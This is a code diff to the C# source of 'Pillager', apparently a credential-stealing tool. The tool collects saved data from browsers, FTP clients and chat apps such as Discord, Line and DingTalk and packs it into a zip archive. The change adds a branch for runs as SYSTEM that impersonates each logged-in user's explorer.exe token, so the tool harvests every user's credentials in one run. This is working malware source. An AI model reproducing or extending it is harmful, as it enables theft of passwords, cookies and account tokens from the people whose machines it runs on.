@@ -1,4 +1,6 @@
-﻿using System.IO;
+﻿using System;
+using System.Diagnostics;
+using System.IO;
 using Pillager.Browsers;
 using Pillager.FTPs;
 using Pillager.Helper;
@@ -20,6 +22,37 @@ namespace Pillager
             if (File.Exists(savezippath)) File.Delete(savezippath);
             Directory.CreateDirectory(savepath);
 
+            if (Environment.UserName.ToLower() == "system")
+            {
+                foreach (Process p in Process.GetProcesses())
+                {
+                    if (p.ProcessName.ToLower() == "explorer" && Methods.ImpersonateProcessToken(p.Id))
+                    {
+                        string usersavepath = Path.Combine(savepath, Methods.GetProcessUserName(p.Id));
+                        Directory.CreateDirectory(usersavepath);
+                        SaveAll(usersavepath);
+                        Native.RevertToSelf();
+                    }
+                }
+            }
+            else
+            {
+                SaveAll(savepath);
+            }
+
+            //Zip
+            ZipStorer zip = ZipStorer.Create(savezippath);
+            foreach (var item in Directory.GetDirectories(savepath))
+                zip.AddDirectory(ZipStorer.Compression.Deflate, item, "");
+            foreach (var item in Directory.GetFiles(savepath))
+                zip.AddFile(ZipStorer.Compression.Deflate, item, Path.GetFileName(item));
+            zip.Close();
+
+            Directory.Delete(savepath, true);
+        }
+
+        static void SaveAll(string savepath)
+        {
             //Browsers
             IE.Save(savepath);
             OldSogou.Save(savepath);//SogouExplorer < 12.x
@@ -65,16 +98,6 @@ namespace Pillager
             DingTalk.Save(savepath);
             Line.Save(savepath);
             Discord.Save(savepath);
-
-            //Zip
-            ZipStorer zip = ZipStorer.Create(savezippath);
-            foreach (var item in Directory.GetDirectories(savepath))
-                zip.AddDirectory(ZipStorer.Compression.Deflate, item, "");
-            foreach (var item in Directory.GetFiles(savepath))
-                zip.AddFile(ZipStorer.Compression.Deflate, item, Path.GetFileName(item));
-            zip.Close();
-
-           Directory.Delete(savepath, true);
         }
     }
 }
